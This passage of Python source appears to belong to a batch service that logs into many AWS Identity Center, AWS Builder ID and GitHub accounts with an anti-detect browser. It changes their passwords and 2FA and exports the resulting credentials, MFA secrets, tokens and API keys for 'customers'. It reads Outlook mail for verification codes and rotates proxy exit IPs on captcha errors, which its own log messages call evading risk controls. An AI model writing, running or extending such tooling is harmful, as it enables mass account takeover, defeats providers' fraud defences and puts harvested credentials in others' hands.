            mfa_map[email] = secret

    ordered_emails: list[str] = []
    seen: set[str] = set()
    result_by_email = {r.email: r for r in job.results if r.email}
    for account in job.accounts:
        if not account.email or account.email in seen:
            continue
        result = result_by_email.get(account.email)
        if account.email in password_map or account.email in mfa_map or (result and (result.changed_password or result.changed_mfa)):
            ordered_emails.append(account.email)
            seen.add(account.email)
    for email in list(password_map) + list(mfa_map):
        if email and email not in seen:
            ordered_emails.append(email)
            seen.add(email)

    lines = ["email|new_password|new_mfa"]
    for email in ordered_emails:
        password = password_map.get(email, "")
        mfa_secret = mfa_map.get(email, "")
        if password or mfa_secret:
            lines.append(f"{email}|{password}|{mfa_secret}")
    if len(lines) <= 1:
        return

    path = out_dir / f"kiro-security-changes-{job.id}.txt"
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    path.chmod(0o600)
    job.security_changes_path = str(path)
    job.log(f"已生成本地改密/MFA 汇总文档：{path.name}（{len(lines) - 1} 个账号）")


def run_one_change_password(job: Job, acc: AccountInput, options: dict[str, Any]) -> AccountResult:
    """Login then change password and/or 2FA. Does not collect JSON / tokens."""
    login_mode = str(options.get("login_mode") or "idc").strip().lower()
    if login_mode in STUDENT_LOGIN_MODES:
        return run_one_student_change_password(job, acc, options)
    if login_mode == "github":
        return run_one_github_change_password(job, acc, options)
    if login_mode == "idc":
        return run_one_idc_change_password(job, acc, options)
    return AccountResult(acc.idx, acc.email, False, f"登录后改密不支持该登录方式：{login_mode}")


def run_one_github_change_password(job: Job, acc: AccountInput, options: dict[str, Any]) -> AccountResult:
    """GitHub personal account: direct GitHub login, password and TOTP settings."""
    prefix = f"#{acc.idx} {acc.email}"

    def log(message: str) -> None:
        job.log(f"{prefix}: {message}")

    if job.stop_event.is_set():
        return AccountResult(acc.idx, acc.email, False, "已中断（任务被手动停止，未执行）")

    do_change_password = bool(options.get("do_change_password", True))
    do_change_mfa = bool(options.get("do_change_mfa", False))
    if not do_change_password and not do_change_mfa:
        return AccountResult(acc.idx, acc.email, False, "未选择要修改的 GitHub 安全项")

    debug_dir = Path(__file__).parent / "debug_social" / job.id / "github_change" / f"{acc.idx:03d}"
    profile_dir = camoufox_profile_dir(job, acc, "github_change")
    current_secret = (acc.mfa_secret or "").strip()
    log(f"开始 GitHub 个人号登录后改密/2FA：{change_actions_label(options)}")
    log(f"使用 Camoufox 独立 profile：{Path(profile_dir).name}")
    if current_secret:
        log(f"已提供 GitHub 旧 2FA 密钥（{mask_mfa_secret(current_secret)}）")

    if do_change_password:
        new_password = (
            random_account_password()
            if options.get("password_mode") == "random"
            else str(options.get("new_password") or DEFAULT_NEW_PASSWORD)
        )
        if new_password == acc.password:
            if do_change_mfa:
                log("GitHub 当前密码已等于目标新密码，自动跳过改密并继续处理 2FA")
                do_change_password = False
                new_password = ""
            else:
                return AccountResult(acc.idx, acc.email, False, "GitHub 新密码与当前密码相同")
    else:
        new_password = ""

    saved_pw, _save_password_early = _make_early_password_saver(job, acc, log)
    _save_mfa_early = _make_early_mfa_saver(job, acc, log) if do_change_mfa else None
    if do_change_password:
        record_intended_password(job, acc, new_password, log)

    def _drive_once(candidate_new_password: str) -> idc.LoginOutcome:
        return githubb.drive_github_change_security(
            email=acc.email,
            password=acc.password,
            new_password=candidate_new_password,
            mfa_secret=current_secret,
            log=log,
            headless=options["headless"],
            proxy=acc.proxy,
            timeout_s=options["login_timeout"],
            failure_wait_s=options.get("failure_wait", DEFAULT_FAILURE_WAIT_SECONDS),
            stop_event=job.stop_event,
            debug_dir=str(debug_dir),
            profile_dir=profile_dir,
            on_password_changed=_save_password_early,
            on_secret=_save_mfa_early,
            do_change_password=do_change_password,
            do_change_mfa=do_change_mfa,
        )

    outcome = _drive_once(new_password)
    if outcome.changed_password:
        _save_password_early(new_password)

    # Retry only before either security mutation has been confirmed. Once the
    # authenticator has been replaced, the old login TOTP is no longer usable.
    rc_max = int(options.get("risk_retry", 3) if options.get("risk_retry") is not None else 3)
    rc_attempt = 0
    pool_i = [0]
    while (
        not outcome.ok
        and not outcome.changed_mfa
        and not outcome.changed_password
        and rc_attempt < rc_max
        and not job.stop_event.is_set()
    ):
        if not (is_captcha_error(outcome.error) or is_proxy_conn_error(outcome.error)):
            break
        rc_attempt += 1
        reason = "验证码/风控" if is_captcha_error(outcome.error) else "代理连接异常"
        if not switch_exit_ip(acc, options, log, reason, rc_attempt, rc_max, pool_i):
            break
        log(f"GitHub 风控规避重试（第 {rc_attempt}/{rc_max} 次）")
        outcome = _drive_once(new_password)
        if outcome.changed_password:
            _save_password_early(new_password)

    if (
        not outcome.ok
        and not outcome.changed_mfa
        and looks_like_password_policy_error(outcome.error)
        and do_change_password
        and options.get("password_mode") == "random"
        and not job.stop_event.is_set()
    ):
        retry_password = stronger_account_password()
        log("GitHub 改密密码策略不通过，自动生成更强新密码并重试一次")
        record_intended_password(job, acc, retry_password, log)
        retry_outcome = _drive_once(retry_password)
        if retry_outcome.changed_password:
            _save_password_early(retry_password)
        if retry_outcome.ok:
            log("GitHub 自动重试改密成功")
            new_password = retry_password
            outcome = retry_outcome
        else:
            outcome = retry_outcome

    changed_mfa = bool(getattr(outcome, "changed_mfa", False))
    export_mfa_secret = ""
    if do_change_mfa and outcome.mfa_secret and (
        changed_mfa or outcome.mfa_secret != current_secret
    ):
        export_mfa_secret = outcome.mfa_secret
    final_password = str(saved_pw.get("password") or new_password) if outcome.changed_password else ""
    if do_change_password:
        update_password_ledger_status(
            job,
            acc,
            "success" if outcome.ok and outcome.changed_password else "failed",
            "" if outcome.ok else (outcome.error or ""),
            log,
        )
    if not outcome.ok:
        log(f"GitHub 改密/2FA 失败：{outcome.error}")
        return AccountResult(
            acc.idx,
            acc.email,
            False,
            outcome.error,
            outcome.changed_password,
            mfa_secret=export_mfa_secret,
            final_password=final_password,
            changed_mfa=changed_mfa,
        )

    parts: list[str] = []
    if do_change_password:
        parts.append(f"新密码={final_password}" if outcome.changed_password else "密码未改")
    if do_change_mfa:
        parts.append("已更换 GitHub 2FA" if changed_mfa else "2FA 未改")
    message = "，".join(parts) or "登录后未选择修改项"
    log(f"GitHub 改密/2FA 成功，{message}")
    return AccountResult(
        acc.idx,
        acc.email,
        True,
        message,
        outcome.changed_password,
        mfa_secret=export_mfa_secret,
        final_password=final_password,
        changed_mfa=changed_mfa,
    )


def run_one_student_change_password(job: Job, acc: AccountInput, options: dict[str, Any]) -> AccountResult:
    prefix = f"#{acc.idx} {acc.email}"

    def log(message: str) -> None:
        job.log(f"{prefix}: {message}")

    if job.stop_event.is_set():
        return AccountResult(acc.idx, acc.email, False, "已中断（任务被手动停止，未执行）")

    debug_dir = Path(__file__).parent / "debug_mfa" / job.id / f"{acc.idx:03d}"
    profile_dir = camoufox_profile_dir(job, acc, "builder_id_change")
    mail_password = acc.outlook_password()
    mfa_secret = (acc.mfa_secret or "").strip()
    if not mail_password and not mfa_secret:
        return AccountResult(acc.idx, acc.email, False, "学生号改密需要 Outlook 邮箱密码（PASS MAIL）或已有 2FA 密钥")

    do_change_password = bool(options.get("do_change_password", True))
    do_change_mfa = bool(options.get("do_change_mfa", False))
    do_remove_old_mfa = bool(options.get("do_remove_old_mfa", False))
    log(f"开始学生号登录后改密/2FA（AWS Builder ID 资料页）：{change_actions_label(options)}")
    log(f"使用 Camoufox 独立 profile：{Path(profile_dir).name}")
    if mfa_secret:
        log(f"已提供 2FA 密钥（{mask_mfa_secret(mfa_secret)}）；验证码页将按页面要求使用 2FA 或邮箱验证码")
    mailbox = None
    if mail_password:
        mailbox = outlook_otp.GraphMailbox(acc.email, mail_password, proxy=acc.proxy, log=log)
        try:
            mailbox.ensure_token()
            log("Outlook 邮箱可读取，准备收 AWS 验证码")
        except Exception as extra_exc:
            if mfa_secret:
                log(f"Outlook 邮箱无法读信，将仅能使用 2FA：{extra_exc}")
            else:
                log(f"Outlook 邮箱无法读信：{extra_exc}。继续尝试登录；若 AWS 弹出邮箱验证码则会失败")
            mailbox = None

    if do_change_password:
        new_password = random_account_password() if options.get("password_mode") == "random" else options["new_password"]
        if new_password == acc.password:
            if do_change_mfa or do_remove_old_mfa:
                log("当前 AWS 密码已等于目标新密码，自动跳过改密并继续处理 2FA")
                do_change_password = False
                new_password = fallback_new_password(acc.password)
            else:
                return AccountResult(acc.idx, acc.email, False, "新密码与当前 AWS 密码相同")
    else:
        new_password = fallback_new_password(acc.password)
    saved_pw, _save_password_early = _make_early_password_saver(job, acc, log)
    _save_mfa_early = _make_early_mfa_saver(job, acc, log) if do_change_mfa else None
    if do_change_password:
        record_intended_password(job, acc, new_password, log)

    def _drive_once(candidate_new_password: str) -> idc.LoginOutcome:
        return builderid.drive_change_password(
            acc.email,
            acc.password,
            candidate_new_password,
            mail_password=mail_password,
            log=log,
            headless=options["headless"],
            proxy=acc.proxy,
            timeout_s=options["login_timeout"],
            failure_wait_s=options.get("failure_wait", DEFAULT_FAILURE_WAIT_SECONDS),
            window_index=acc.idx - 1,
            window_count=options["threads"],
            debug_dir=str(debug_dir),
            stop_event=job.stop_event,
            mailbox=mailbox,
            mfa_secret=mfa_secret,
            on_password_changed=_save_password_early,
            on_secret=_save_mfa_early,
            do_change_password=do_change_password,
            do_change_mfa=do_change_mfa,
            do_remove_old_mfa=do_remove_old_mfa,
            profile_dir=profile_dir,
        )

    outcome = _drive_once(new_password)
    if outcome.changed_password:
        _save_password_early(new_password)

    rc_max = int(options.get("risk_retry", 3) if options.get("risk_retry") is not None else 3)
    rc_attempt = 0
    pool_i = [0]
    while not outcome.ok and rc_attempt < rc_max and not job.stop_event.is_set():
        if not (is_captcha_error(outcome.error) or is_proxy_conn_error(outcome.error)):
            break
        rc_attempt += 1
        reason = "验证码/风控" if is_captcha_error(outcome.error) else "代理连接异常"
        if not switch_exit_ip(acc, options, log, reason, rc_attempt, rc_max, pool_i):
            break
        log(f"风控规避重试（第 {rc_attempt}/{rc_max} 次）")
        outcome = _drive_once(new_password)
        if outcome.changed_password:
            _save_password_early(new_password)

    if (
        not outcome.ok
        and do_change_password
        and looks_like_password_policy_error(outcome.error)
        and not job.stop_event.is_set()
    ):
        retry_password = stronger_account_password()
        log("改密密码策略不通过，自动生成更强新密码并重试一次")
        if do_change_password:
            record_intended_password(job, acc, retry_password, log)
        retry_outcome = _drive_once(retry_password)
        if retry_outcome.changed_password:
            _save_password_early(retry_password)
        if retry_outcome.ok:
            log("自动重试改密成功")
            new_password = retry_password
            outcome = retry_outcome
        else:
            outcome = retry_outcome

    changed_mfa = bool(getattr(outcome, "changed_mfa", False))
    export_mfa_secret = ""
    if do_change_mfa and outcome.mfa_secret and (changed_mfa or outcome.mfa_secret != mfa_secret):
        export_mfa_secret = outcome.mfa_secret
    final_password = str(saved_pw.get("password") or new_password) if outcome.changed_password else ""
    if do_change_password:
        update_password_ledger_status(
            job, acc,
            "success" if outcome.ok and outcome.changed_password else "failed",
            "" if outcome.ok else (outcome.error or ""),
            log,
        )
    if not outcome.ok:
        log(f"学生号改密/2FA 失败：{outcome.error}")
        return AccountResult(
            acc.idx, acc.email, False, outcome.error,
            outcome.changed_password,
            mfa_secret=export_mfa_secret,
            final_password=final_password,
            changed_mfa=changed_mfa,
        )
    message = _security_change_message(
        do_change_password, do_change_mfa, outcome.changed_password, changed_mfa,
        final_password, export_mfa_secret, do_remove_old_mfa,
    )
    log(f"学生号改密/2FA 成功，{message}")
    return AccountResult(
        acc.idx, acc.email, True, message,
        outcome.changed_password, mfa_secret=export_mfa_secret,
        final_password=final_password, changed_mfa=changed_mfa,
    )


def run_one_idc_change_password(job: Job, acc: AccountInput, options: dict[str, Any]) -> AccountResult:
    prefix = f"#{acc.idx} {acc.email}"

    def log(message: str) -> None:
        job.log(f"{prefix}: {message}")

    if job.stop_event.is_set():
        return AccountResult(acc.idx, acc.email, False, "已中断（任务被手动停止，未执行）")

    debug_dir = Path(__file__).parent / "debug_mfa" / job.id / f"{acc.idx:03d}"
    eff_start_url = acc.start_url or options.get("start_url") or ""
    if not eff_start_url:
        return AccountResult(acc.idx, acc.email, False, "IDC 改密需要 Start URL")
    do_change_password = bool(options.get("do_change_password", True))
    do_change_mfa = bool(options.get("do_change_mfa", False))
    if do_change_password:
        new_password = random_account_password() if options.get("password_mode") == "random" else options["new_password"]
        if new_password == acc.password:
            if do_change_mfa:
                log("当前密码已等于目标新密码，自动跳过改密并继续处理 2FA")
                do_change_password = False
                new_password = fallback_new_password(acc.password)
            else:
                return AccountResult(acc.idx, acc.email, False, "新密码与当前密码相同")
    else:
        new_password = fallback_new_password(acc.password)
    saved_pw, _save_password_early = _make_early_password_saver(job, acc, log)
    _save_mfa_early = _make_early_mfa_saver(job, acc, log) if do_change_mfa else None
    if do_change_password:
        record_intended_password(job, acc, new_password, log)
    log(f"开始 IDC 登录后改密/2FA（门户设置，不导出 JSON）：{change_actions_label(options)}")

    def _drive_once(candidate_new_password: str) -> idc.LoginOutcome:
        return idc.drive_change_password(
            eff_start_url,
            acc.email,
            acc.password,
            candidate_new_password,
            log=log,
            headless=options["headless"],
            proxy=acc.proxy,
            timeout_s=options["login_timeout"],
            failure_wait_s=options.get("failure_wait", DEFAULT_FAILURE_WAIT_SECONDS),
            window_index=acc.idx - 1,
            window_count=options["threads"],
            debug_dir=str(debug_dir),
            stop_event=job.stop_event,
            mfa_secret=acc.mfa_secret,
            on_password_changed=_save_password_early,
            on_secret=_save_mfa_early,
            do_change_password=do_change_password,
            do_change_mfa=do_change_mfa,
        )

    outcome = _drive_once(new_password)
    if outcome.changed_password:
        _save_password_early(new_password)

    rc_max = int(options.get("risk_retry", 3) if options.get("risk_retry") is not None else 3)
    rc_attempt = 0
    pool_i = [0]
    while not outcome.ok and rc_attempt < rc_max and not job.stop_event.is_set():
        if not (is_captcha_error(outcome.error) or is_proxy_conn_error(outcome.error)):
            break
        rc_attempt += 1
        reason = "验证码/风控" if is_captcha_error(outcome.error) else "代理连接异常"
        if not switch_exit_ip(acc, options, log, reason, rc_attempt, rc_max, pool_i):
            break
        log(f"风控规避重试（第 {rc_attempt}/{rc_max} 次）")
        outcome = _drive_once(new_password)
        if outcome.changed_password:
            _save_password_early(new_password)

    if (
        not outcome.ok
        and do_change_password
        and looks_like_password_policy_error(outcome.error)
        and not job.stop_event.is_set()
    ):
        retry_password = stronger_account_password()
        log("改密密码策略不通过，自动生成更强新密码并重试一次")
        if do_change_password:
            record_intended_password(job, acc, retry_password, log)
        retry_outcome = _drive_once(retry_password)
        if retry_outcome.changed_password:
            _save_password_early(retry_password)
        if retry_outcome.ok:
            log("自动重试改密成功")
            new_password = retry_password
            outcome = retry_outcome
        else:
            outcome = retry_outcome

    final_password = str(saved_pw.get("password") or new_password) if outcome.changed_password else ""
    changed_mfa = bool(getattr(outcome, "changed_mfa", False))
    export_mfa_secret = ""
    if do_change_mfa and outcome.mfa_secret and (changed_mfa or outcome.mfa_secret != (acc.mfa_secret or "")):
        export_mfa_secret = outcome.mfa_secret
    if do_change_password:
        update_password_ledger_status(
            job, acc,
            "success" if outcome.ok and outcome.changed_password else "failed",
            "" if outcome.ok else (outcome.error or ""),
            log,
        )
    if not outcome.ok:
        log(f"IDC 改密/2FA 失败：{outcome.error}")
        return AccountResult(
            acc.idx, acc.email, False, outcome.error,
            outcome.changed_password,
            mfa_secret=export_mfa_secret,
            final_password=final_password,
            changed_mfa=changed_mfa,
        )
    message = _security_change_message(
        do_change_password, do_change_mfa, outcome.changed_password, changed_mfa,
        final_password, export_mfa_secret,
    )
    log(f"IDC 改密/2FA 成功，{message}")
    return AccountResult(
        acc.idx, acc.email, True, message,
        outcome.changed_password, mfa_secret=export_mfa_secret,
        final_password=final_password, changed_mfa=changed_mfa,
    )


def run_change_password_job(job: Job, accounts: list[AccountInput], options: dict[str, Any]) -> None:
    job.status = "running"
    job.started_at = time.time()
    job.total = len(accounts)
    threads = max(1, min(int(options.get("threads") or 1), len(accounts) or 1, MAX_THREADS_PER_JOB))
    options["threads"] = threads
    job.threads = threads
    out_dir = _job_out_dir(job)
    job.log_path = str(out_dir / f"kiro-job-log-{job.id}.txt")
    Path(job.log_path).touch(mode=0o600, exist_ok=True)
    runtime_proxy_cleanup = configure_runtime_proxy_pool(job, accounts, options, job.log)
    threads = max(1, min(int(options.get("threads") or 1), len(accounts) or 1, MAX_THREADS_PER_JOB))
    password_mode_label = "每号随机" if options.get("password_mode") == "random" else "固定"
    login_mode_labels = {
        "idc": "AWS IAM Identity Center",
        "student": "Kiro 学生号（AWS Builder ID）",
        "github": "GitHub 个人号",
    }
    login_mode = str(options.get("login_mode") or "idc")
    login_mode_label = login_mode_labels.get(login_mode, login_mode)
    actions_label = change_actions_label(options)
    job.log(f"开始登录后改密/2FA：账号 {len(accounts)} 个，并发 {threads}，登录方式：{login_mode_label}，操作：{actions_label}，单号超时 {options['login_timeout']} 秒，失败等待 {options.get('failure_wait', DEFAULT_FAILURE_WAIT_SECONDS)} 秒，密码模式：{password_mode_label}。不导出 JSON / token。")
    audit("password_change_job.started", jobId=job.id, customerId=job.customer_id, total=len(accounts), threads=threads, loginMode=login_mode, changePassword=bool(options.get("do_change_password", True)), changeMfa=bool(options.get("do_change_mfa", False)))
    runtime_pool = runtime_proxy_pool(options)
    if not runtime_pool:
        apply_mihomo_exit_proxy(accounts, log=job.log)
    if mihomo.enabled() and not runtime_pool:
        try:
            cur = mihomo.current_node()
            d = mihomo.node_delay(cur) if cur else None
            if d is None:
                job.log(f"出口节点预热：当前节点 {cur or '(无)'} 不通，启动前先切健康节点")
                mihomo.pick_and_switch(exclude=cur, log=job.log)
            else:
                job.log(f"出口节点预热：当前节点 {cur} 健康（延迟 {d}ms），直接开跑")
        except Exception as exc:
            job.log(f"出口节点预热跳过（探测异常：{exc}）")
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            pending_accounts = iter(accounts)
            free_runtime_proxies = list(runtime_pool)
            futures: dict[Any, tuple[AccountInput, str]] = {}

            def submit_next(released_proxy: str = "") -> bool:
                if job.stop_event.is_set():
                    return False
                try:
                    next_acc = next(pending_accounts)
                except StopIteration:
                    return False
                assigned_proxy = ""
                if runtime_pool:
                    if released_proxy:
                        free_runtime_proxies.append(released_proxy)
                    assigned_proxy = free_runtime_proxies.pop(0) if free_runtime_proxies else ""
                    if not assigned_proxy:
                        return False
                    next_acc.proxy = assigned_proxy
                futures[executor.submit(run_one_change_password, job, next_acc, options)] = (next_acc, assigned_proxy)
                return True

            for _ in range(threads):
                if not submit_next():
                    break
            while futures:
                done_set, _pending = wait(futures, return_when=FIRST_COMPLETED)
                for future in done_set:
                    acc, released_proxy = futures.pop(future)
                    try:
                        result = future.result()
                    except Exception as exc:
                        result = AccountResult(acc.idx, acc.email, False, f"任务异常：{exc}")
                    with JOBS_LOCK:
                        job.results.append(result)
                        job.results.sort(key=lambda item: item.idx)
                        job.done += 1
                        if result.ok:
                            job.ok += 1
                        else:
                            job.failed += 1
                        save_job_history()
                    job.log(f"{acc.email}: {result.message}（进度 {job.done}/{job.total}）")
                    submit_next(released_proxy)
        pw_map: dict[str, str] = {}
        for item in read_password_ledger(job).get("accounts") or []:
            email = str(item.get("email") or "").strip()
            pwd = str(item.get("newPassword") or "").strip()
            status = str(item.get("status") or "")
            if email and pwd and (item.get("applied") or status in {"pending", "applied", "success", "failed_after_apply"}):
                pw_map[email] = pwd
        for result in job.results:
            if result.email and result.final_password and (result.ok or result.changed_password):
                pw_map[result.email] = result.final_password
        pw_lines = [f"{email}:{pwd}" for email, pwd in pw_map.items()]
        if pw_lines:
            accounts_pw_path = out_dir / f"kiro-accounts-passwords-{job.id}.txt"
            accounts_pw_path.write_text("\n".join(pw_lines) + "\n", encoding="utf-8")
            accounts_pw_path.chmod(0o600)
            job.accounts_pw_path = str(accounts_pw_path)
            job.log(f"已生成账号密码提取文件：{len(pw_lines)} 个账号（email:password；含预先落盘、站点已接受、以及改密成功的新密码）")
        _export_job_mfa_secrets(job, out_dir)
        _export_security_changes(job, out_dir)
        _export_combined_credentials(job, out_dir)
        if job.stop_requested:
            job.status = "stopped"
            job.log(f"已中断：成功 {job.ok}，失败/跳过 {job.failed}（未完成的账号可重新提交）")
        else:
            job.status = "finished" if job.failed == 0 else "failed"
            job.log(f"完成：成功 {job.ok}，失败 {job.failed}")
        audit("password_change_job.finished", jobId=job.id, customerId=job.customer_id, ok=job.ok, failed=job.failed)
    except Exception as exc:
        job.status = "failed"
        job.error = str(exc)
        job.log(f"任务失败：{exc}")
        audit("password_change_job.failed", jobId=job.id, customerId=job.customer_id, error=str(exc))
    finally:
        try:
            runtime_proxy_cleanup()
        except Exception as exc:
            audit("mihomo.runtime_cleanup_failed", jobId=job.id, customerId=job.customer_id, error=str(exc))
        job.finished_at = time.time()
        save_job_history()
        SCHEDULER_WAKE.set()


def run_job(job: Job, accounts: list[AccountInput], options: dict[str, Any]) -> None:
    job.status = "running"
    job.started_at = time.time()
    job.total = len(accounts)
    threads = max(1, min(int(options.get("threads") or 1), len(accounts) or 1, MAX_THREADS_PER_JOB))
    options["threads"] = threads
    job.threads = threads
    out_dir = Path(__file__).parent / "exports" / job.customer_id
    out_dir.mkdir(parents=True, exist_ok=True)
    out_dir.chmod(0o700)
    job.log_path = str(out_dir / f"kiro-job-log-{job.id}.txt")
    Path(job.log_path).touch(mode=0o600, exist_ok=True)
    runtime_proxy_cleanup = configure_runtime_proxy_pool(job, accounts, options, job.log)
    threads = max(1, min(int(options.get("threads") or 1), len(accounts) or 1, MAX_THREADS_PER_JOB))
    password_mode_label = "每号随机" if options.get("password_mode") == "random" else "固定"
    login_mode_labels = {
        "idc": "AWS IAM Identity Center",
        "m365": "Microsoft 365",
        "google": "Google 个人号",
        "github": "GitHub 个人号",
        "student": "Kiro 学生号（AWS Builder ID）",
    }
    login_mode_label = login_mode_labels.get(str(options.get("login_mode") or "idc"), str(options.get("login_mode") or "idc"))
    job.log(f"开始任务：账号 {len(accounts)} 个，并发 {threads}，登录方式：{login_mode_label}，单号超时 {options['login_timeout']} 秒，失败等待 {options.get('failure_wait', DEFAULT_FAILURE_WAIT_SECONDS)} 秒，token等待 {options.get('token_wait', DEFAULT_TOKEN_WAIT_SECONDS)} 秒，密码模式：{password_mode_label}")
    audit("job.started", jobId=job.id, customerId=job.customer_id, total=len(accounts), threads=threads, headless=options["headless"], oidcRegion=options["oidc_region"], kiroRegion=options["kiro_region"])
    runtime_pool = runtime_proxy_pool(options)
    if not runtime_pool:
        apply_mihomo_exit_proxy(accounts, log=job.log)
    # 出口节点预热：启动前先探测当前 mihomo 出口是否健康。
    # 若当前节点不通，先切到一个健康节点（一次），避免所有并发账号首次代理连接
    # 全部失败 → 各自进入换 IP 重试 → 被全局锁串行错峰（实测曾占单号总耗时一半）。
    if mihomo.enabled() and not runtime_pool:
        try:
            cur = mihomo.current_node()
            d = mihomo.node_delay(cur) if cur else None
            if d is None:
                job.log(f"出口节点预热：当前节点 {cur or '(无)'} 不通，启动前先切健康节点")
                mihomo.pick_and_switch(exclude=cur, log=job.log)
            else:
                job.log(f"出口节点预热：当前节点 {cur} 健康（延迟 {d}ms），直接开跑")
        except Exception as exc:
            job.log(f"出口节点预热跳过（探测异常：{exc}）")
    exported_all: list[dict[str, Any]] = []
    api_keys_all: list[str] = []
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            pending_accounts = iter(accounts)
            free_runtime_proxies = list(runtime_pool)
            futures: dict[Any, tuple[AccountInput, str]] = {}

            def submit_next(released_proxy: str = "") -> bool:
                if job.stop_event.is_set():
                    return False
                try:
                    next_acc = next(pending_accounts)
                except StopIteration:
                    return False
                assigned_proxy = ""
                if runtime_pool:
                    if released_proxy:
                        free_runtime_proxies.append(released_proxy)
                    assigned_proxy = free_runtime_proxies.pop(0) if free_runtime_proxies else ""
                    if not assigned_proxy:
                        return False
                    next_acc.proxy = assigned_proxy
                futures[executor.submit(run_one, job, next_acc, options)] = (next_acc, assigned_proxy)
                return True

            for _ in range(threads):
                if not submit_next():
                    break

            while futures:
                done_set, _pending = wait(futures, return_when=FIRST_COMPLETED)
                for future in done_set:
                    acc, released_proxy = futures.pop(future)
                    try:
                        result = future.result()
                    except Exception as exc:
                        result = AccountResult(acc.idx, acc.email, False, f"任务异常：{exc}")
                    with JOBS_LOCK:
                        job.results.append(result)
                        job.results.sort(key=lambda item: item.idx)
                        job.done += 1
                        if result.ok:
                            job.ok += 1
                            exported_all.extend(result.exported)
                            api_keys_all.extend(result.api_keys)
                        else:
                            job.failed += 1
                        save_job_history()
                    job.log(f"{acc.email}: {result.message}（进度 {job.done}/{job.total}）")
                    submit_next(released_proxy)
        if not options.get("api_key_only"):
            for priority, item in enumerate(exported_all):
                item["priority"] = priority
        if not options.get("api_key_only"):
            out_path = out_dir / f"kiro-login-export-{job.id}.json"
            out_path.write_text(json.dumps(exported_all, ensure_ascii=False, indent=2), encoding="utf-8")
            out_path.chmod(0o600)
            job.export_path = str(out_path)
            split_zip_path = out_dir / f"kiro-login-export-split-{job.id}.zip"
            split_accounts_per_file = clamp_int(options.get("split_accounts_per_file"), 1, 1, 1000)
            split_count = build_split_export_zip(str(out_path), str(split_zip_path), split_accounts_per_file)
            job.export_split_zip_path = str(split_zip_path)
            unit = "账号文件" if split_accounts_per_file == 1 else f"文件（每份最多 {split_accounts_per_file} 个账号）"
            job.log(f"已生成拆分导出 ZIP：{split_count} 个{unit}")
        else:
            out_path = None
        if api_keys_all:
            api_keys_path = out_dir / f"kiro-api-keys-{job.id}.txt"
            api_keys_path.write_text("\n".join(api_keys_all) + "\n", encoding="utf-8")
            api_keys_path.chmod(0o600)
            job.api_keys_path = str(api_keys_path)
        # 绑定了新 MFA 的账号：导出 email:secret 供下载保存。
        # 优先取成功 result 的密钥；再合并 early 落盘文件——只要抠到过密钥，
        # 即使账号后续（改密/换 token/扫 profile）失败也不丢，避免密钥变孤儿。
        _export_job_mfa_secrets(job, out_dir)
        # 一键提取账号密码：所有登录成功的账号 email:password（密码为改密后的最终密码）
        pw_lines = [f"{r.email}:{r.final_password}" for r in job.results if r.ok and r.email and r.final_password]
        if pw_lines:
            accounts_pw_path = out_dir / f"kiro-accounts-passwords-{job.id}.txt"
            accounts_pw_path.write_text("\n".join(pw_lines) + "\n", encoding="utf-8")
            accounts_pw_path.chmod(0o600)
            job.accounts_pw_path = str(accounts_pw_path)
            changed_cnt = len([r for r in job.results if r.ok and r.final_password and r.changed_password])
            kept_cnt = len(pw_lines) - changed_cnt
            job.log(f"已生成账号密码提取文件：{len(pw_lines)} 个账号（email:password，可一键下载；其中新改密 {changed_cnt} 个，沿用原密码 {kept_cnt} 个）")
        _export_combined_credentials(job, out_dir)
        if job.stop_requested:
            job.status = "stopped"
            job.log(f"已中断：成功 {job.ok}，失败/跳过 {job.failed}，导出 {0 if options.get('api_key_only') else len(exported_all)} 条，API Key {len(api_keys_all)} 条（未完成的账号可重新提交）")
        else:
            job.status = "finished" if job.failed == 0 else "failed"
            job.log(f"完成：成功 {job.ok}，失败 {job.failed}，导出 {0 if options.get('api_key_only') else len(exported_all)} 条，API Key {len(api_keys_all)} 条")
        audit("job.finished", jobId=job.id, customerId=job.customer_id, ok=job.ok, failed=job.failed, exported=0 if options.get("api_key_only") else len(exported_all), apiKeys=len(api_keys_all), path=str(out_path) if out_path else None, apiKeysPath=job.api_keys_path or None, apiKeyOnly=options.get("api_key_only"))
    except Exception as exc:
        job.status = "failed"
        job.error = str(exc)
        job.log(f"任务失败：{exc}")
        audit("job.failed", jobId=job.id, customerId=job.customer_id, error=str(exc))
    finally:
        try:
            runtime_proxy_cleanup()
        except Exception as exc:
            audit("mihomo.runtime_cleanup_failed", jobId=job.id, customerId=job.customer_id, error=str(exc))
        job.finished_at = time.time()
        save_job_history()
        SCHEDULER_WAKE.set()


def job_to_dict(job: Job) -> dict[str, Any]:
    with JOBS_LOCK:
        return {
            "id": job.id,
            "kind": job.kind,
            "status": job.status,
            "stopRequested": job.stop_requested,
            "total": job.total,
            "done": job.done,
            "ok": job.ok,
            "failed": job.failed,
            "error": job.error,
            "logs": list(job.logs),
            "downloadReady": bool(job.export_path and Path(job.export_path).exists()),
            "splitDownloadReady": bool(job.export_path and Path(job.export_path).exists()),
            "apiKeysDownloadReady": bool(job.api_keys_path and Path(job.api_keys_path).exists() and Path(job.api_keys_path).stat().st_size > 0),
            "mfaSecretsDownloadReady": bool(job.mfa_secrets_path and Path(job.mfa_secrets_path).exists() and Path(job.mfa_secrets_path).stat().st_size > 0),
            "accountsPwDownloadReady": bool(job.accounts_pw_path and Path(job.accounts_pw_path).exists() and Path(job.accounts_pw_path).stat().st_size > 0),
            "combinedCredentialsDownloadReady": bool(job.combined_credentials_path and Path(job.combined_credentials_path).exists() and Path(job.combined_credentials_path).stat().st_size > 0),
            "passwordLedgerDownloadReady": bool(job.password_ledger_path and Path(job.password_ledger_path).exists() and Path(job.password_ledger_path).stat().st_size > 0),
            "securityChangesDownloadReady": bool(job.security_changes_path and Path(job.security_changes_path).exists() and Path(job.security_changes_path).stat().st_size > 0),
            "logDownloadReady": bool(job.log_path and Path(job.log_path).exists()),
            "createdAt": int(job.created_at),
            "finishedAt": int(job.finished_at or 0),
            "retryableCount": (
                len([a for a in job.accounts if (a.idx, a.email) not in {(r.idx, r.email) for r in job.results if r.ok}])
                if (job.status in {"finished", "failed", "stopped"} and job.accounts)
                else 0
            ),
            "results": [
                {
                    "idx": r.idx,
                    "email": r.email,
                    "ok": r.ok,
                    "message": r.message,
                    "changedPassword": r.changed_password,
                    "exportedCount": len(r.exported),
                    "apiKeyCount": len(r.api_keys),
                    "mfaSecret": r.mfa_secret,
                    "changedMfa": r.changed_mfa,
                }
                for r in job.results
            ],
        }


